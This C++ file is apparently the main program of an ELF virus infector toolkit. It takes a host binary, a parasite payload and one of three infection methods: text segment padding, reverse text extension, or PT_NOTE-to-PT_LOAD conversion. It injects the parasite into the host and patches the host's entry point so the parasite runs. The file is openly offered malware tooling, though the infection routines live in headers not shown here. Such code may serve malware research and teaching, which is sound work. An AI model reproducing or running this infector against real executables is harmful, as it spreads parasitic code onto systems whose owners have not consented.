#include "common/string.hh"
#include "infector/common_infection.hh"
#include "infector/padding_infector.hh"
#include "infector/pt_note_infector.hh"
#include "infector/reverse_text_infector.hh"
#include "nostdlib/stdio.hh"
#include "redirection/entry_point.hh"
#include "redirection/libc_start_main.hh"

const char* TEXT_PADDING = "text_padding";
const char* REVERSE_TEXT = "reverse_text";
const char* PT_NOTE_TO_LOAD = "pt_note";

// Usage %s <host> <parasite> <infection method>
int main(int argc, char** argv) {
  if (argc != 4) {
    return EXIT_FAILURE;
  }

  auto method = argv[3];
  bool ret = false;

  if (vt::common::String(method) == TEXT_PADDING) {
    ret = vt::infector::infect<vt::infector::PaddingInfector,
                               vt::redirection::EntryPointPatcher>(argv[1],
                                                                   argv[2], 64);
  } else if (vt::common::String(method) == REVERSE_TEXT) {
    ret = vt::infector::infect<vt::infector::ReverseTextInfector,
                               vt::redirection::EntryPointPatcher>(argv[1],
                                                                   argv[2], 64);
  } else if (vt::common::String(method) == PT_NOTE_TO_LOAD) {
    ret = vt::infector::infect<vt::infector::PtNoteInfector,
                               vt::redirection::EntryPointPatcher>(argv[1],
                                                                   argv[2], 64);
  }

  return ret ? EXIT_SUCCESS : EXIT_FAILURE;
}